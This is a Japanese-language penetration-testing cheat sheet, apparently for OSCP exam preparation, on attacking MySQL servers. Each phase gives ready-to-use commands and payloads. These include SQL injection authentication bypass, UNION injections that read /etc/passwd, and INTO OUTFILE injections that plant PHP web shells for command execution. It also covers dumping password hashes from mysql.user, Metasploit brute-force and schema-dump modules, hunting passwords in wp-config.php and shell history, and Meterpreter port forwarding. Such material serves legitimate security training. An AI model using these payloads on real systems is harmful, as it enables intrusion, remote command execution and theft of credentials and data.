# mysql

## 🎯 概要
MySQLは、世界中で最も普及しているオープンソースのリレーショナルデータベース管理システム（RDBMS）の一つです。ペネトレーションテストやOSCPにおいて、MySQLは「ゴールデンフリース（金色の羊毛）」と呼ばれ、機密情報（顧客データ、認証資格情報、PIIなど）の宝庫となります。不適切な設定（rootユーザーの空パスワードなど）やWebアプリケーションのSQLインジェクション（SQLi）を介して、データの窃取、認証回避、さらにはOSコマンド実行（RCE）へと繋がる極めて重要な攻撃対象です。

---

## 🛠 代表的な用途
- **機密データの窃取**: データベース内のテーブルからユーザー情報、パスワードハッシュ、ビジネス機密を抽出。
- **認証情報の収集**: `mysql.user`テーブルからのハッシュ取得や、他サービスで再利用可能なパスワードの特定。
- **ファイルシステム操作**: `LOAD_FILE`による機密ファイルの読み取りや、`INTO OUTFILE`によるWebシェルの設置。
- **OSCPでの利用ポイント**: 手動でのSQLi列挙（UNIONベース、Booleanベースなど）や、デフォルトの認証設定の確認が頻出します。

---

## 🔍 基本コマンド
```bash
# ローカルサーバーにrootユーザーでログイン（パスワード入力を促す）
mysql -u root -p

# リモートホストに特定のユーザーで接続
mysql -u <username> -p -h <IP_ADDRESS>

# ログインせずに外部からSQLクエリを直接実行
mysql -u <username> -p<password> -h <IP> -e "show databases;"

# ログイン後の基本操作
show databases;          # データベース一覧を表示
use <database_name>;     # 使用するデータベースを選択
show tables;             # テーブル一覧を表示
describe <table_name>;   # テーブルの構造（カラム）を確認
```

---

## 🧪 よく使う攻撃シナリオ
- **デフォルト認証の悪用**: 初期設定のままパスワードが設定されていないrootアカウントへのログイン試行。
- **SQLインジェクションによる潜入**: Webフォーム等の不備を突き、認証をバイパス（`' OR 1=1 -- -`）したり、UNION句を用いてDB内部を列挙。
- **Webシェルの設置を通じたRCE**: データベースユーザーに`FILE`権限がある場合、Web公開ディレクトリにPHPシェルを書き込み、OSコマンドを実行。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# Nmapを使用して標準ポート 3306 の稼働状況とバージョンを特定
nmap -sV -p 3306 <TARGET_IP>

# Nmapのデフォルトスクリプトを使用してサービスの詳細情報や認証制限を確認
nmap -sC -sV -p 3306 <TARGET_IP>

# Metasploitを使用してMySQLのバージョン情報を正確に取得
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 > set RHOSTS <TARGET_IP>
msf6 > run
```

### 🧭 Enumeration（外部サービスの詳細調査）
```sql
# 現在のデータベースユーザーと接続元のホスト名を確認
SELECT user();

# データベースエンジンの正確なバージョンを確認
SELECT @@version;

# 現在使用中のデータベース名を特定
SELECT database();

# information_schemaを使用して全てのデータベース、テーブル、カラムを一括列挙
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema';

# 特定のテーブルからデータを抽出（例：wp_usersテーブル）
SELECT user_login, user_pass FROM wordpress.wp_users;
```

### 🚪 Initial Access（初期侵入）
```sql
# SQLi: UNIONベースの攻撃で現在のデータベース名、ユーザー名、バージョンを取得
' UNION SELECT 1,2,database(),user(),@@version,6 -- -

# Metasploitを使用したログインブルートフォース攻撃（空パスワードやデフォルトの確認）
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > set BLANK_PASSWORDS true
msf6 > set RHOSTS <TARGET_IP>
msf6 > run

# Webアプリ経由でOSの /etc/passwd ファイルの内容を読み取る
' UNION SELECT null, LOAD_FILE('/etc/passwd'), null -- -
```

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# システム内のWeb設定ファイル（wp-config.phpなど）からDBのクリアテキストパスワードを探索
grep -i "DB_PASSWORD" /var/www/html/wp-config.php

# ユーザーのコマンド履歴（.bash_history）からMySQLログイン時のパスワードを特定
cat ~/.bash_history | grep mysql

# MySQLプロセスの実行権限を確認
ps aux | grep mysqld
```

### 📈 Privilege Escalation（権限昇格）
```sql
# MySQLのFILE権限を悪用してWeb公開ディレクトリにWebシェルを書き込む
' UNION SELECT "<?php system($_GET['cmd']); ?>", null, null INTO OUTFILE "/var/www/html/shell.php" -- -

# ユーザー定義関数（UDF）を作成してroot権限でOSコマンドを実行（管理者権限が必要）
# (既存の共有ライブラリをロードしてシステムコマンドを実行する手法)
```

### 🔑 Credential Access（認証情報探索）
```sql
# ユーザー名、接続元ホスト、パスワードハッシュの一覧を抽出（管理者権限が必要）
SELECT user, host, authentication_string FROM mysql.user;

# 旧バージョンのMySQLにおける資格情報の抽出
SELECT user, host, password FROM mysql.user;

# 抽出したパスワードハッシュをファイルに保存
SELECT concat(user, ':', authentication_string) FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';
```

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# MetasploitのMeterpreterセッション経由で、ターゲット内部のDBポートをローカルに転送
meterpreter > portfwd add -l 3306 -r <INTERNAL_DB_IP> -p 3306

# 転送したポートに対してローカルからログイン試行
mysql -u root -h 127.0.0.1
```

---

## 🧰 便利オプション一覧
- `-u <user>`：接続するユーザー名を指定。
- `-p`：パスワードを対話的に入力（`-p'password'` のようにスペースなしで直接指定も可能）。
- `-h <host>`：接続先のリモートサーバーのIPまたはホスト名。
- `-P <port>`：接続ポート番号（デフォルトは3306）。
- `-e "<query>"`：非対話モードでクエリを実行し、即座に結果を返して終了。
- `-X`：出力をXML形式で表示。
- `-H`：出力をHTML形式で表示。

---

## 🚀 実践例
```bash
# 【実践1】rootユーザーでのリモートログインと空パスワードの迅速な確認
mysql -u root -h 10.10.10.11 -p'' -e "show databases;"

# 【実践2】SQLiを利用して標的サーバー上のWebルートにOSコマンド実行用のバックドアを作成
# URLパラメータに入力する例
' UNION SELECT null, '<?php echo shell_exec($_GET["cmd"]); ?>', null INTO OUTFILE '/var/www/html/cmd.php' -- -

# 【実践3】Metasploitを使用してデータベース全体のスキーマをダンプ
msf6 > use auxiliary/scanner/mysql/mysql_schemadump
msf6 > set RHOSTS 10.10.10.11
msf6 > set USERNAME root
msf6 > run
```

---

## 🧩 他ツールとの組み合わせ
- **sqlmap** → SQLiの自動検知、データベースの自動ダンプ、`--os-shell`による対話的シェルの取得を完全に自動化します。
- **Metasploit** → バージョン特定、資格情報スキャン、ハッシュ窃取、UDFを利用した攻撃などの豊富なモジュールを提供。
- **ffuf / Gobuster** → `phpMyAdmin`や`config.php`などのディレクトリやファイルを列挙し、DBへのアクセス経路を特定。
- **John the Ripper / Hashcat** → `mysql.user`テーブルから抽出したパスワードハッシュのオフラインクラッキング。

---

## 📝 注意点（OSCP 試験での使い方）
- **手動操作の習熟**: OSCP試験では`sqlmap`の使用に制限（1ホストのみ等）があるため、UNIONベースやエラーベースなどの手動SQLクエリ構築ができることが必須です。
- **権限の確認**: `LOAD_FILE`や`INTO OUTFILE`は、DBユーザーに`FILE`特権があり、かつOS側のディレクトリに適切なパーミッションがないと動作しません。
- **コメントアウトの使い分け**: MySQLでは `-- `（末尾にスペースが必要）、`#`、`/* ... */` がコメントとして有効です。

---

## 🔗 参考リンク
- 公式：[MySQL 8.0 Reference Manual](https://dev.mysql.com/doc/refman/8.0/en/)
- 自動化ツール：[sqlmap project](https://sqlmap.org/)
- 良質解説：[Pentestmonkey MySQL SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheets/sql-injection/mysql-sql-injection-cheat-sheet)
